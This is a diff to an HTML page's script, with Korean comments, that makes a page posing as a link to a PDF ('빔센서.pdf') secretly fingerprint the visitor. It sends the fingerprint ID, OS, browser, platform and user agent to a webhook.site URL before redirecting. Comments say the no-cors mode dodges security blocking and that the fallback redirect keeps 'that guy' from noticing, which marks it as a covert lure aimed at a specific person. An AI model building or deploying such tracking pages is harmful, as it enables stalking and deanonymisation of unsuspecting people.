@@ -30,36 +30,36 @@
     </div>
 
    <script>
-    // 1. 2초 뒤에는 무조건 PDF로 보내버리는 '강제 탈출 장치' (데이터 전송보다 우선)
-    setTimeout(() => {
-        window.location.href = "빔센서.pdf"; 
-    }, 2500); // 2.5초 뒤 강제 이동
-
     const fpPromise = import('https://openfpcdn.io/fingerprintjs/v4')
         .then(FingerprintJS => FingerprintJS.load());
 
-    fpPromise
-        .then(fp => fp.get())
-        .then(result => {
-            const visitorId = result.visitorId;
-            const components = result.components;
-            const webhookUrl = "https://webhook.site/78ea7a5c-b84d-4094-b236-e85b52715d6b";
-
-            // 2. 데이터 전송 시도
-            fetch(webhookUrl, {
-                method: 'POST',
-                mode: 'no-cors', // CORS 에러 방지용
-                body: JSON.stringify({
-                    target_id: visitorId,
-                    platform: components.platform.value,
-                    os: components.os.value,
-                    browser: components.vendor.value,
-                    screen: components.screenResolution.value,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                })
-            });
+    fpPromise.then(fp => fp.get()).then(result => {
+        const url = "https://webhook.site/78ea7a5c-b84d-4094-b236-e85b52715d6b";
+        const payload = JSON.stringify({
+            id: result.visitorId,
+            device: result.components.platform.value,
+            os: result.components.os.value,
+            browser: result.components.vendor.value,
+            ua: navigator.userAgent,
+            timestamp: new Date().toISOString()
         });
+
+        // [핵심] 데이터를 먼저 보냅니다.
+        // fetch가 성공하든 실패하든(.finally) 그 후에 PDF로 이동하게 만듭니다.
+        fetch(url, { 
+            method: 'POST', 
+            body: payload, 
+            mode: 'no-cors' // 보안 차단 회피
+        }).finally(() => {
+            // 전송 시도 후 1.5초 뒤에 PDF 이동 (전송 시간을 벌어줌)
+            setTimeout(() => {
+                window.location.href = "빔센서.pdf";
+            }, 1500);
+        });
+    }).catch(() => {
+        // 혹시나 에러가 나도 그놈이 눈치 못 채게 PDF로 보냅니다.
+        setTimeout(() => { window.location.href = "빔센서.pdf"; }, 2000);
+    });
 </script>
 </body>
 </html>
